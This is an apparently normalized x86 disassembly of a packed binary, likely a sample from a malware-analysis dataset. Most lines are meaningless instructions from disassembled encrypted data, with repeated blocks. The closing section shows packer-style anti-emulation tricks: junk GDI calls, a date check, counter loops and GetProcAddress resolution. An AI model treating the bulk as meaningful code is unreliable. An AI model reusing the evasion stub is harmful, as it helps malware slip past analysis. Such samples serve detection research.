xchg ebp eax
sbb al 0xd0
imul esp [ esi - 0x623e83ab ] 0x5059595
add eax 0x5050505
push 0xffffffc2
leave
jl r-xdata
push 0x5
add eax 0x955534f1
push eax
push 0x6a
sbb al 0xd0
rcr [ ebp + 0x5059595 ] 0x5
add eax 0x6a050505
retn 0x7cc9
js r-xdata
push 0x6a
pop ebp
push 0x6a
add eax 0xf3050505
sbb al 0xe8
push ebp
jl r-xdata
and cl [ edx + 0x6a74af7c ]
push 0x7d
cmp [ ebp + 0x6a ] bh
push 0x6a
add eax 0x7e7c5510
jne r-xdata
dec ebp
push eax
push 0x6a
std
pushad
call 0x1365dfdc
imul edx [ ebp - 0x10836a6b ] 0x9a6a6a70
adc [ ebp + 0x7c6a6a66 ] al
pushfd
push 0x6a
push ss
out dx al
rcl [ ebp + 0x6a5a017c ] cl
push 0x7d
xor dl [ edx + ebp * 2 + 0x6a ]
rol [ ecx + 0x7c ] 0x1
int3
push 0x1e
adc [ ebx + 0x7c ] ah
cmpsd [ esi ] [ edi ]
sub [ edx + 0x6a ] ebp
add eax 0x6a26f47c
push 0xffffff9a
adc [ eax - 0x6f ] cl
xchg ebp eax
xchg ebp eax
jl r-xdata
jl r-xdata
jl r-xdata
push 0x6a
jl r-xdata
add eax 0x9a050505
adc [ edi ] eax
inc esi
popad
push 0x6a
sbb al 0x28
inc ecx
push 0xc36a6a6a
sar [ ebp - 0x6b ] 0x1
push 0xffffffc3
fstp [ esi ]
dec ebp
adc [ esi - 0x66 ] cl
adc [ edi - 0x29595b4 ] esp
div [ edx - 0x62 ]
add al 0xc6
jge r-xdata
xchg esp eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x7ce2ff05
adc edx [ edx - 0xcfa6a6b ]
lodsb [ esi ]
popfd
jl r-xdata
xchg ebp eax
call [ ebp - 0x6ac6fc96 ]
xchg ebp eax
xchg ebp eax
sbb [ eax ] bl
push 0x5
push 0x3
cmp [ ebp - 0x2fe76a6b ] edx
mov ecx 0x7d531ec5
sub bh [ edx ]
push 0x6a
add eax 0x7cc355a6
aad 0x48
push 0x6a
add eax 0x5050505
add eax 0xc56a0505
push 0x6a
push ss
je r-xdata
shr [ ebp + 0x18 ] 0x1
rcl [ ecx ] 0x1
retn
insd
aad 0x9a
pop ss
popfd
xchg ebp eax
xchg ebp eax
xchg ebp eax
call [ ebp - 0x6ac6fc96 ]
push 0x16
add eax 0x7c9dacf3
xor dh [ edx + ebp * 2 + 0x6a ]
add eax 0x109a0505
cdq
push 0x5056a6a
push ds
insb
jl r-xdata
push 0x6a
jge r-xdata
nop
xchg ebp eax
xchg ebp eax
add eax 0xd0180505
and eax 0xa97cc3c5
jle r-xdata
insd
push 0x9b7d6a6a
cmp [ ebp + 0x18189595 ] edx
push 0x6a
add eax 0xc2050505
jl r-xdata
sub [ edx + 0x6a ] ch
add eax 0x5050505
add eax 0xc26ac305
dec esp
push 0x6a
push 0x5
add eax 0x99109a05
xchg ecx eax
sub al 0x6a
push 0xffffff95
xchg ebp eax
jl r-xdata
jl r-xdata
jg r-xdata
jl r-xdata
push esp
push 0x6a
jl r-xdata
push 0x5
add eax 0xd0520505
jno r-xdata
sbb [ ebp + 0x68 ] ch
push 0x6a
jge r-xdata
xchg ebx eax
xchg ebp eax
xchg ebp eax
add eax 0x717c0505
push 0x6a
add eax 0x5050505
sbb al ah
test [ ebp - 0x6f ] edi
pop edx
push 0x6a
int3
0x5ccb
push 0x14
sub ebp [ ecx ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
popad
xchg esp eax
xchg ebp eax
xchg ebp eax
0x95959d19 0xff95
xchg ebp eax
push 0x3
xchg ebp eax
xchg ebp eax
jl r-xdata
add edi [ ecx ]
xchg ebp eax
push 0x5
add eax 0x9a050505
and al [ ebp + 0x18 ]

int1
jl r-xdata
cld
cmpsb [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
push ebx
push 0x6a
add eax 0x7c6c1e05
cmp [ edi + 0x6a ] bh
jge r-xdata
sub_491a21
push esi
jl r-xdata
dec edx
push 0x6a
add eax 0x6a423f7c
push 0x5
add eax 0x6a7a7c7c
push 0x5
add eax 0x5050505
add eax 0x69f01605
xchg ebp eax
jl r-xdata
xchg esi eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
push 0xffffffe3
lds ebx [ eax + edx * 8 ]
popad
mov ch 0x7d
cmp eax 0x7c6a6a78
adc [ ebp + edx * 4 + 0x1cf30595 ] edx
shr [ ebp + 0x18 ] 0x1
rcl [ ecx ] 0x1
retn
push 0x6a
push 0x2
or eax 0x7c959595
mov ah 0x56
push 0x6a
add eax 0x8dc26a05
retn 0x257d
push 0x5056a6a
sbb al 0xc8
insd
push edx
xchg esi eax
int 0xcc
int3
sub_491a47
lds edi [ ebp + 0x1 ]
js r-xdata
push 0x6a
jl r-xdata
push 0xffffffff
test [ eax ] ebx
rol [ ebp + 0x7c ] 0x1
xchg ebp eax
pop edx
push 0x6a
add eax 0x5050505
add eax 0x1cf30505
enter 0xffc5 0xe7
push ds
dec ebx
jl r-xdata
retn 0xc28d
pushad
push 0x6a
add eax 0x2bbd129a
push 0x6a
jl r-xdata
xchg ebp eax
add eax 0x5050505
push 0xffffffe3
lds ebx [ eax + edx * 8 ]
popad
mov ch 0x7d
cmp eax 0x7c6a6a78
adc [ ebp + edx * 4 + 0x1cf30595 ] edx
shr [ ebp + 0x18 ] 0x1
rcl [ ecx ] 0x1
retn
push 0x6a
add eax 0x7c551005
sbb dl [ ecx + 0x6a ]
push 0xffffff9a
adc [ edi + 0x2a ] esp
push 0x6a
sbb al bl
inc ecx
sbb al dl
push ecx
jl r-xdata
add eax 0xc81cf305
jpo r-xdata

dec edx
push 0x6a
add eax 0x6a423f7c
push 0x5
add eax 0x6a7a7c7c
push 0x5
add eax 0x5050505
add eax 0x69f01605
xchg ebp eax
jl r-xdata
add eax 0xa6050505
dec esi
jl r-xdata
push 0x6a
add cl [ 0x7c959595 ]
mov ah 0x56
push 0x6a
add eax 0x8dc26a05
retn 0x257d
push 0x6a
push 0x2
or eax 0x7c959595
push 0x5056a6a
sbb al 0xc8
insd
push edx
xchg esi eax
jns r-xdata
mov dh 0x64
push 0x6a
push ss
push 0x5
add eax 0x5050505
add eax 0x1cf34a1e
enter 0xffd1 0xe7
jl r-xdata
push 0xc26a6a6a
mov ch 0x1c
shr [ ecx - 0x54 ] 0x1
enter 0x7c69 0x39
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0x99511605
sbb al dl
inc ecx
lds edi [ ebx + ecx * 4 + 0x50 ]
push 0x6a
add eax 0x85e06205
rcl [ eax ] cl
inc edi
jl r-xdata
jl r-xdata
popad
push 0x6a
add eax 0x95e2cf2a
xchg ebp eax
[ edi ]
pop edx
0x6a3a7111 0x2a6a
fdisi8087_nop
xchg ebp eax
xchg ebp eax
jl r-xdata
add eax 0x5050505
add eax 0xc49dd096
jge r-xdata
jne r-xdata
int 0xcc
int3
push 0x6a
add eax 0x7a7c7c05
push 0x6a
add eax 0x5050505
add eax 0xf0160505
imul edx [ ebp + 0x6a68267c ] 0x1c05056a
enter 0x526d 0x96
nop
xchg ebp eax
xchg ebp eax
add eax 0x73c81cf3
sbb al 0xe8
arpl bx si
sbb al 0xc0
leave
push esp
xchg edi eax
jl r-xdata
cmp ch [ edx + 0x6a ]
sar edi 0x1
out 0x7c eax
xchg ebp eax
jb r-xdata
add edx [ 0x1c959595 ]
shl [ ecx - 0x65a9517b ] 0x1
adc [ edx - 0x396a6a6b ] dl
push 0x5
add eax 0xc01cf305
push ebx
sbb al 0xd8
stc
cmpsb [ esi ] [ edi ]
dec esi
jl r-xdata
sbb al 0xd8
push 0x7c
bound ebp [ bp + si + 0x6a ]
add eax 0xc87c0505
je r-xdata
adc al 0x79
adc eax 0xc6959597
jl r-xdata
jge r-xdata
jge r-xdata
shl [ ecx - 0x65a95177 ] 0x1
adc [ ebp + edx * 4 - 0x2396a6b ] edi
push 0x5
adc al 0xab
push 0x3
cmp [ ebp + 0x667c9595 ] edx
sub [ edx + 0x6a ] ch
add eax 0x5050505
add eax 0xc5050505
jl r-xdata
xchg ebp eax
xchg ebp eax
sbb al 0xd1
mov cl 0x85
scasb [ edi ]
push esi
0x95959210 0xc695
jno r-xdata
xchg esi eax
0x6a673917 0x1d6a
push 0x5
add eax 0x5050505
add eax 0x95ff0505
std
xchg ebp eax
xchg ebp eax
test [ ebp + 0x1d7c96ff ] edx
inc eax
push 0x6a
push ds
jns r-xdata
mov ah bh
aad 0x6a
and edx [ ecx - 0x6b ]
xchg ebp eax
xchg ebp eax
push ds
imul edi [ ebp + 0x4b ] 0x50
push 0x6a
push ss
push ecx
cdq
test al 0xf5
jg r-xdata
push 0x5
sbb al 0xd1
mov cl 0x89
scasb [ edi ]
push esi
0x9595bc11 0xc695
std
push 0x16
xchg ebp eax
0x95959d12 0xfd95
insd
mov edi 0xc36a9595
popfd
lodsb [ esi ]
leave
mov cl 0x81
0x95948b11 0x2a95
cmp eax 0x529595f4
shl [ ecx - 0x6a50f273 ] 0x1
xchg ebp eax
call [ ecx - 0x6a5a6a03 ]
xchg ebp eax
retn 0x6ac6
push esp
jl r-xdata
shl [ 0x1d65d01d ] 0x1
shl [ ebp + 0x1d ] 0x1
rol [ ebp + 0x1d ] 0x1
rcl [ ebp + 0x18 ] 0x1
fdiv [ ecx + 0x18 ]
shl [ ecx ] 0x1
push edx
shl [ ecx - 0x22 ] 0x1
push 0x5
add eax 0x16050505
imul esi [ ebp + 0x7a64179a ] 0x6a
push 0x6a
shr [ ecx + 0x16 ] 0x1
fcomp st6
retn
lodsb [ esi ]
je r-xdata
jae r-xdata
jno r-xdata
push 0x5
add eax 0x256a0505
xchg ecx eax
xchg esp eax
xchg ebp eax
xchg ebp eax
push ds
sbb eax 0x95959495
push 0xffffffe1
mov cl 0x81
sbb al 0xd9
mov cl 0xbd
sbb [ ecx ] bl
mov cl 0x35
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0x9a050505
adc [ edx + 0x52959595 ] dl
push 0x5
add eax 0xc2050505
sbb al 0xd3
lea edi [ ebp + ebx * 2 + 0x60 ]
push 0x6a
add eax 0x109a0505
jpe r-xdata
call 0x17e3b345
cmp [ edi + 0x6a ] esp
push 0x1d
retn
add eax 0x5050505
push ds
push ebx
jge r-xdata
popad
push 0x6a
add eax 0x7e7cc005
sub eax 0x5056a6a
add eax 0xc0050505
jl r-xdata
add eax 0x2d7e7cc0
push 0x6a
add eax 0x5050505
add eax 0x2eda7cc0
push 0x6a
push 0x6a
retn
retn 0x131c
push 0x6a
push ebx
push 0x6a
push ss
push ecx
cdq
sbb al 0xd1
mov cl 0xb5
adc [ ebp - 0x66 ] dl
adc [ ecx + 0x1e959595 ] edi
shl [ ecx - 0x4e1e9573 ] 0x1
test [ esi - 0x2ee13aae ] edx
mov cl 0xbd
jge r-xdata
shr [ ecx - 0x6b ] 0x1
xchg ebp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
add eax 0x109a0505
xchg edx eax
xchg ebp eax
xchg ebp eax
xchg ebp eax
push edx
mov ebp 0x1ee1c36a
jno r-xdata
mov ebp 0x6a710f7d
je r-xdata
sub bh [ ebx + edx * 2 + 0x5a ]
push 0x6a
add eax 0xc37c6aa6
insd
push 0x6a
push ss
push esp
xchg edi eax
adc [ ebx - 0x66 ] ah
adc [ edi + ecx * 2 + 0x4d7c6a6a ] dl
jle r-xdata
push 0xffffffcc
int3
jns r-xdata
push 0x5
jge r-xdata
pop eax
jne r-xdata
push 0x5
0x6a4c0a11 0x6a6a
loopne r-xdata
rcr [ esi ] 0x79
jne r-xdata
push edi
sub ch [ edx + 0x6a ]
std
add eax 0x44077c05
push 0x6a
add eax 0x5050505
int3
push 0x5
add eax 0x25fd0505
sub ebx esi
sbb [ edx + 0x22 ] ebp
inc eax
push 0x6a
add eax 0x14791ec0
jns r-xdata
jl r-xdata
jl r-xdata
push 0x6a
push 0x6a
lds edi [ edx + ebx * 4 + 0x48 ]
push 0x6a
add eax 0x18050505
out dx eax
dec esp
push 0x6a
add eax 0x1e050505
push esi
sbb al 0xd0
jl r-xdata
int3
push edi
push 0x6a
push 0x6a
add eax 0xa6050505
pop esp
jl r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
adc [ edx + ebx * 4 + 0x11 ] bl
push esp
push 0x6a
jl r-xdata
je r-xdata
jl r-xdata
push eax
jl r-xdata
sub al 0x6a
push 0xfffffff3
adc [ edi + 0x7c ] al
adc al 0x79
test [ ecx + 0x5c109595 ] edx
0x6a675411 0x7c6a
pop eax
push 0x6a
add eax 0x5050505
add eax 0xcce3ffcf
push edx
push ds
push edi
sbb al 0xd0
inc ecx
push ds
push esp
sbb al 0xd0
inc ebx
int 0x7c
mov dh 0x39
push 0x6a
add eax 0x5050505
add eax 0x9a050505
adc [ eax + 0x47 ] dh
push 0x6a
sbb [ eax ] dl
pop ebp
push 0x7cc56a6a
pop ecx
sub [ edx + 0x6a ] ch
push ecx
xchg ebp eax
xchg ebp eax
xchg ebp eax
jge r-xdata
push 0x7c
pop ebx
loope r-xdata
and ch [ edx + 0x6a ]
0x6a2e0311 0x7c6a
dec eax
inc ebp
push 0x6a
add eax 0xb9c26ac5
sbb [ eax ] dl
jge r-xdata
fisubr [ esi - 0x15 ]
cwde
retn 0xd31c
shl [ ecx - 0x4e2e6b7b ] 0x1
lea ebp [ edx - 0x2f ]
mov cl 0x89
push ds
shl [ ecx - 0x72295177 ] 0x1
jl r-xdata
mov ebx 0x87d01cf3
int 0xff
jecxz r-xdata
add eax 0xbbff55a6
sbb al 0xd0
xchg ebp ecx
jmp ebx
sbb al 0xd0
popad
jl r-xdata
dec ebx
inc esi
push 0x6a
add eax 0x55a60505
push 0x6a
adc [ edi + 0x7c ] al
dec esp
push 0x6a
push ds
call 0x6a193785
sub_491cae
lds ebx [ esi ]
push ebx
jl r-xdata
fcomp st6
push edx
sar [ ebp - 0x3d ] 0x1
fcomp st6
retn
insd
push 0x6a
add eax 0x79140505
xchg ebp eax
xchg ebp eax
sbb al 0xd1
mov cl 0x85
scasb [ edi ]
push esi
0x95959210 0xc695
push 0x3
cmp [ ebp + 0x667c9595 ] edx
sub [ edx + 0x6a ] ch
add eax 0x5050505
add eax 0xc5050505
jl r-xdata
jno r-xdata
adc eax 0xc6959597
jl r-xdata
adc al 0x79
jge r-xdata
push esp
jl r-xdata
push 0x5
add eax 0x16050505
imul esi [ ebp + 0x7a64179a ] 0x6a
push 0x6a
shr [ ecx + 0x16 ] 0x1
shl [ 0x1d65d01d ] 0x1
shl [ ebp + 0x1d ] 0x1
rol [ ebp + 0x1d ] 0x1
rcl [ ebp + 0x18 ] 0x1
fdiv [ ecx + 0x18 ]
shl [ ecx ] 0x1
push edx
shl [ ecx - 0x22 ] 0x1
xchg esi eax
0x6a673917 0x1d6a
push 0x5
add eax 0x5050505
add eax 0x95ff0505
std
xchg ebp eax
xchg ebp eax
test [ ebp + 0x1d7c96ff ] edx
inc eax
push 0x6a
push ds
jns r-xdata
jae r-xdata
fcomp st6
retn
lodsb [ esi ]
je r-xdata
add eax 0x9a050505
adc [ edx + 0x52959595 ] dl
push 0x5
add eax 0xc2050505
sbb al 0xd3
lea edi [ ebp + ebx * 2 + 0x60 ]
push 0x6a
add eax 0x109a0505
jpe r-xdata
jno r-xdata
push 0x5
add eax 0x256a0505
xchg ecx eax
xchg esp eax
xchg ebp eax
xchg ebp eax
push ds
sbb eax 0x95959495
push 0xffffffe1
mov cl 0x81
sbb al 0xd9
mov cl 0xbd
sbb [ ecx ] bl
mov cl 0x35
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
push ds
push ebx
jge r-xdata
popad
push 0x6a
add eax 0x7e7cc005
sub eax 0x5056a6a
add eax 0xc0050505
jl r-xdata
add eax 0x2d7e7cc0
push 0x6a
add eax 0x5050505
add eax 0x2eda7cc0
push 0x6a
push 0x6a
retn
call 0x17e3b345
cmp [ edi + 0x6a ] esp
push 0x1d
retn
retn 0x131c
push 0x6a
push ebx
push 0x6a
push ss
push ecx
cdq
sbb al 0xd1
mov cl 0xb5
adc [ ebp - 0x66 ] dl
adc [ ecx + 0x1e959595 ] edi
shl [ ecx - 0x4e1e9573 ] 0x1
test [ esi - 0x2ee13aae ] edx
mov cl 0xbd
jge r-xdata
shr [ ecx - 0x6b ] 0x1
xchg ebp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
add eax 0x109a0505
xchg edx eax
xchg ebp eax
xchg ebp eax
xchg ebp eax
push edx
mov ebp 0x1ee1c36a
jno r-xdata
mov ebp 0x6a710f7d
je r-xdata
sub bh [ ebx + edx * 2 + 0x5a ]
push 0x6a
add eax 0xc37c6aa6
insd
push 0x6a
push ss
push esp
xchg edi eax
adc [ ebx - 0x66 ] ah
adc [ edi + ecx * 2 + 0x4d7c6a6a ] dl
jle r-xdata
push 0xffffffcc
int3
jns r-xdata
push 0x5
jge r-xdata
pop eax
jne r-xdata
push 0x5
0x6a4c0a11 0x6a6a
loopne r-xdata
rcr [ esi ] 0x79
jne r-xdata
push edi
sub ch [ edx + 0x6a ]
std
add eax 0x44077c05
push 0x6a
add eax 0x5050505
int3
push 0x5
add eax 0x25fd0505
sub ebx esi
sbb [ edx + 0x22 ] ebp
inc eax
push 0x6a
add eax 0x14791ec0
jns r-xdata
jl r-xdata
jl r-xdata
push 0x6a
push 0x6a
lds edi [ edx + ebx * 4 + 0x48 ]
push 0x6a
add eax 0x18050505
out dx eax
dec esp
push 0x6a
add eax 0x1e050505
push esi
sbb al 0xd0
jl r-xdata
int3
push edi
push 0x6a
push 0x6a
add eax 0xa6050505
pop esp
jl r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
adc [ edx + ebx * 4 + 0x11 ] bl
push esp
push 0x6a
jl r-xdata
je r-xdata
jl r-xdata
push eax
jl r-xdata
sub al 0x6a
push 0xfffffff3
adc [ edi + 0x7c ] al
adc al 0x79
test [ ecx + 0x5c109595 ] edx
0x6a675411 0x7c6a
pop eax
push 0x6a
add eax 0x5050505
add eax 0xcce3ffcf
push edx
push ds
push edi
sbb al 0xd0
inc ecx
push ds
push esp
sbb al 0xd0
inc ebx
int 0x7c
mov dh 0x39
push 0x6a
add eax 0x5050505
add eax 0x9a050505
adc [ eax + 0x47 ] dh
push 0x6a
sbb [ eax ] dl
pop ebp
push 0x7cc56a6a
pop ecx
sub [ edx + 0x6a ] ch
push ecx
xchg ebp eax
xchg ebp eax
xchg ebp eax
jge r-xdata
push 0x7c
pop ebx
loope r-xdata
and ch [ edx + 0x6a ]
0x6a2e0311 0x7c6a
dec eax
inc ebp
push 0x6a
add eax 0xb9c26ac5
sbb [ eax ] dl
jge r-xdata
fisubr [ esi - 0x15 ]
cwde
retn 0xd31c
shl [ ecx - 0x4e2e6b7b ] 0x1
lea ebp [ edx - 0x2f ]
mov cl 0x89
push ds
shl [ ecx - 0x72295177 ] 0x1
jl r-xdata
mov ebx 0x87d01cf3
int 0xff
jecxz r-xdata
add eax 0xbbff55a6
sbb al 0xd0
xchg ebp ecx
jmp ebx
sbb al 0xd0
popad
jl r-xdata
dec ebx
inc esi
push 0x6a
add eax 0x55a60505
push 0x6a
adc [ edi + 0x7c ] al
dec esp
push 0x6a
push ds
call 0x6a193785
sub_491d03
push edx
sar [ ecx - 0x28 ] 0x1
faddp st3
fcom [ edx - 0x30 ]
inc ecx
fdivr st4
mul bh
push edx
ror [ ebp - 0x6 ] 0x1
out 0xfa al
push edx
push 0x6a
sbb al 0x1d
and eax 0x6a959595
loopne r-xdata
rcl [ ecx - 0x3d ] 0x1
fsub st2
hlt
imul ebp [ edx + 0x6a ] 0x5050505
add eax 0xc57d531e
push 0x2
adc [ ebp - 0x15836a6b ] edx
xchg ebx eax
xchg ebp eax
xchg ebp eax
add eax 0x531ec505
jge r-xdata
mov ebp 0x1ee1c36a
jno r-xdata
push 0x5
add eax 0x5050505
sar [ edx + ebx * 8 + 0x2e ] 0x6a
push 0xffffffc2
sbb al 0x13
or eax 0x7d959595
out dx al
push ebp
push 0x6a
jl r-xdata
push ebx
push 0x6a
jl r-xdata
mov ebp 0x6a710f7d
je r-xdata
sub bh [ ebx + edx * 2 + 0x5a ]
push 0x6a
add eax 0xc37c6aa6
insd
push 0x6a
push ss
push esp
xchg edi eax
adc [ ebx - 0x66 ] ah
adc [ edi + ecx * 2 + 0x4d7c6a6a ] dl
jle r-xdata
push 0xffffffcc
int3
sub eax 0x5056a6a
add eax 0xc0050505
jl r-xdata
dec ebx
push 0x6a
sbb al 0xc0
iretd
ror [ ecx - 0x1f ] 0x1
mov ch 0xdd
jecxz r-xdata
push edx
dec edi
push 0x6a
add eax 0x5050505
add eax 0x9a050505
adc [ edx + 0x52959595 ] dl
jns r-xdata
push 0x5
jge r-xdata
pop eax
jne r-xdata
push 0x5
0x6a4c0a11 0x6a6a
loopne r-xdata
shr [ ecx - 0x6b ] 0x1
xchg ebp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
add eax 0x109a0505
xchg edx eax
xchg ebp eax
xchg ebp eax
xchg ebp eax
push edx
push 0x6a
retn 0x131c
add eax 0x5050505
push ds
push ebx
jge r-xdata
popad
push 0x6a
add eax 0x7e7cc005
rcr [ esi ] 0x79
jne r-xdata
push edi
sub ch [ edx + 0x6a ]
std
add eax 0x44077c05
push 0x6a
add eax 0x5050505
int3
push 0x5
add eax 0x25fd0505
sub ebx esi
sbb [ edx + 0x22 ] ebp
inc eax
push 0x6a
add eax 0x14791ec0
jns r-xdata
jl r-xdata
push ebx
push 0x6a
push ss
push ecx
cdq
sbb al 0xd1
mov cl 0xb5
adc [ ebp - 0x66 ] dl
adc [ ecx + 0x1e959595 ] edi
shl [ ecx - 0x4e1e9573 ] 0x1
test [ esi - 0x2ee13aae ] edx
mov cl 0xbd
jge r-xdata
jl r-xdata
push 0x6a
push 0x6a
lds edi [ edx + ebx * 4 + 0x48 ]
push 0x6a
add eax 0x18050505
out dx eax
dec esp
push 0x6a
add eax 0x1e050505
push esi
sbb al 0xd0
jl r-xdata
int3
push edi
push 0x6a
push 0x6a
add eax 0xa6050505
pop esp
jl r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
adc [ edx + ebx * 4 + 0x11 ] bl
push esp
push 0x6a
jl r-xdata
je r-xdata
jl r-xdata
push eax
jl r-xdata
sub al 0x6a
push 0xfffffff3
adc [ edi + 0x7c ] al
adc al 0x79
test [ ecx + 0x5c109595 ] edx
0x6a675411 0x7c6a
pop eax
push 0x6a
add eax 0x5050505
add eax 0xcce3ffcf
push edx
push ds
push edi
sbb al 0xd0
inc ecx
push ds
push esp
sbb al 0xd0
inc ebx
int 0x7c
mov dh 0x39
push 0x6a
add eax 0x5050505
add eax 0x9a050505
adc [ eax + 0x47 ] dh
push 0x6a
sbb [ eax ] dl
pop ebp
push 0x7cc56a6a
pop ecx
sub [ edx + 0x6a ] ch
push ecx
xchg ebp eax
xchg ebp eax
xchg ebp eax
jge r-xdata
push 0x7c
pop ebx
loope r-xdata
and ch [ edx + 0x6a ]
0x6a2e0311 0x7c6a
dec eax
inc ebp
push 0x6a
add eax 0xb9c26ac5
sbb [ eax ] dl
jge r-xdata
fisubr [ esi - 0x15 ]
cwde
retn 0xd31c
shl [ ecx - 0x4e2e6b7b ] 0x1
lea ebp [ edx - 0x2f ]
mov cl 0x89
push ds
shl [ ecx - 0x72295177 ] 0x1
jl r-xdata
mov ebx 0x87d01cf3
int 0xff
jecxz r-xdata
add eax 0xbbff55a6
sbb al 0xd0
xchg ebp ecx
jmp ebx
sbb al 0xd0
popad
jl r-xdata
dec ebx
inc esi
push 0x6a
add eax 0x55a60505
push 0x6a
adc [ edi + 0x7c ] al
dec esp
push 0x6a
push ds
call 0x6a193785
sub_491f08
sub ch [ edx + 0x6a ]
add eax 0xde7cc205
arpl [ edx + 0x6a ] bp
add eax 0x75587cc3
push 0x6a
add eax 0xfd050505
and eax 0x6a19de2b
and dl [ ecx - 0x6b ]
int3
push edi
push 0x6a
jl r-xdata
inc eax
push 0x6a
add eax 0x14791ec0
jns r-xdata
xchg ebp eax
xchg ebp eax
jge r-xdata
push 0x5
add eax 0x25fd0505
sub ebx esi
sbb [ edx + 0x22 ] ebp
push edi
push 0x6a
add eax 0xa6050505
pop esp
jl r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
adc [ edx + ebx * 4 + 0x11 ] bl
push esp
push 0x6a
jl r-xdata
push 0x6a
lds edi [ edx + ebx * 4 + 0x48 ]
push 0x6a
add eax 0x18050505
out dx eax
sub bh [ ebx + edx * 2 + 0x5a ]
push 0x6a
add eax 0xc37c6aa6
insd
push 0x6a
push ss
push esp
xchg edi eax
adc [ ebx - 0x66 ] ah
adc [ edi + ecx * 2 + 0x4d7c6a6a ] dl
jle r-xdata
dec esp
push 0x6a
add eax 0x1e050505
push esi
sbb al 0xd0
jl r-xdata
adc al 0x79
test [ ecx + 0x5c109595 ] edx
0x6a675411 0x7c6a
pop eax
push 0x6a
add eax 0x5050505
add eax 0xcce3ffcf
push edx
push ds
push edi
sbb al 0xd0
inc ecx
push ds
push esp
sbb al 0xd0
inc ebx
int 0x7c
mov dh 0x39
push 0x6a
add eax 0x5050505
add eax 0x9a050505
adc [ eax + 0x47 ] dh
push 0x6a
sbb [ eax ] dl
pop ebp
push 0x7cc56a6a
pop ecx
sub [ edx + 0x6a ] ch
pop eax
jne r-xdata
push 0x5
0x6a4c0a11 0x6a6a
loopne r-xdata
push eax
jl r-xdata
sub al 0x6a
push 0xfffffff3
adc [ edi + 0x7c ] al
add eax 0x44077c05
push 0x6a
add eax 0x5050505
int3
jl r-xdata
loope r-xdata
and ch [ edx + 0x6a ]
0x6a2e0311 0x7c6a
dec eax
inc ebp
push 0x6a
add eax 0xb9c26ac5
sbb [ eax ] dl
jge r-xdata
jl r-xdata
je r-xdata
fisubr [ esi - 0x15 ]
cwde
retn 0xd31c
shl [ ecx - 0x4e2e6b7b ] 0x1
lea ebp [ edx - 0x2f ]
mov cl 0x89
push ds
shl [ ecx - 0x72295177 ] 0x1
jl r-xdata
mov ebx 0x87d01cf3
int 0xff
jecxz r-xdata
push ecx
xchg ebp eax
push 0x7c
pop ebx
mov ebp 0x6a710f7d
push 0xffffffcc
int3
je r-xdata
add eax 0xbbff55a6
sbb al 0xd0
xchg ebp ecx
jmp ebx
sbb al 0xd0
popad
jl r-xdata
jns r-xdata
push 0x5
jge r-xdata
dec ebx
inc esi
push 0x6a
add eax 0x55a60505
push 0x6a
adc [ edi + 0x7c ] al
dec esp
push 0x6a
push ds
call 0x6a193785
rcr [ esi ] 0x79
jne r-xdata
sub ch [ edx + 0x6a ]
std
push 0x6a
sub_4922da
fcomp st0
jl r-xdata
add eax 0x6dd81cf3
int3
sub eax 0x5056a6a
add eax 0x23f97cc0
push 0x6a
jge r-xdata
push 0x2
adc [ ebp - 0x7c836a6b ] edx
inc ecx
push 0x6a
push ss
push ecx
test [ esi ] ebx
dec ebp
jl r-xdata
daa
push 0x6a
jl r-xdata
push 0x6a
add eax 0x5050505
cmpsb [ esi ] [ edi ]
push ebp
pop esp
push esi
add eax 0x6a7fda7c
push 0x5
add eax 0x5050505
add eax 0x6a3c8b7c
push 0x5
add eax 0x119a0505
and esp [ ecx + 0x6a ]
push 0x7c
adc eax 0x56a6a47
add eax 0x1ec50505
rcr [ ebp - 0x75026a01 ] 0x1
xchg ebp eax
0x68c77c95 0x6a6a
add eax 0xc7cc505
dec ebx
push 0x6a
add eax 0x5050505
add eax 0x7c8d5116
rcr [ ebx + 0x6a ] 0x1
push 0xffffffc6
push 0xffffffe0
jne r-xdata
push 0x6a
push 0x5
add eax 0x5050505
add eax 0xf3975716
adc [ edx + ebx * 4 + 0x10 ] bl
jl r-xdata
inc eax
push 0x6a
dec [ ebx + 0x3cb8fc55 ]
daa
dec ecx
add al ch
sbb eax 0x85fff7a2
ror [ edi ] 0x85
je r-xdata
cdq
inc ebx
push 0x6a
add eax 0x1cf34b1e
enter 0x1e6f 0x4d
sbb al 0xc8
imul esp [ esi - 0x37e30cb2 ] 0x39967c6b
push 0x6a
mov esp ebp
pop ebp
retn 0x4
push 0x6a
add eax 0x5050505
add eax 0x3e7d0505
sub ebp [ edx + 0x6a ]
int3
push edx
push 0x0
push 0x0
call GetNearestColor
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
nop
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
add [ eax ] al
mov [ rw-data ] 0x368e
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
push 0x0
push 0x0
call GetNearestColor
jmp r-xdata
mov [ rw-data ] 0x7fcb
nop
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_492730
lea eax [ ebp - 0x4 ]
call sub_404038
retn
nop
nop
push 0x0
push 0x0
call GetNearestColor
nop
inc [ rw-data ]
cmp [ rw-data ] 0x168a
jne r-xdata
push 0x0
push 0x0
call GetNearestColor
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov [ rw-data ] 0x201e
nop
push 0x0
push 0x0
call GetNearestColor
push 0x0
push 0x0
call GetNearestColor
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
push 0x0
call GetNearestColor
inc [ rw-data ]
cmp [ rw-data ] 0x887d
jne r-xdata
nop
push 0x0
push 0x0
call GetNearestColor
nop
nop
nop
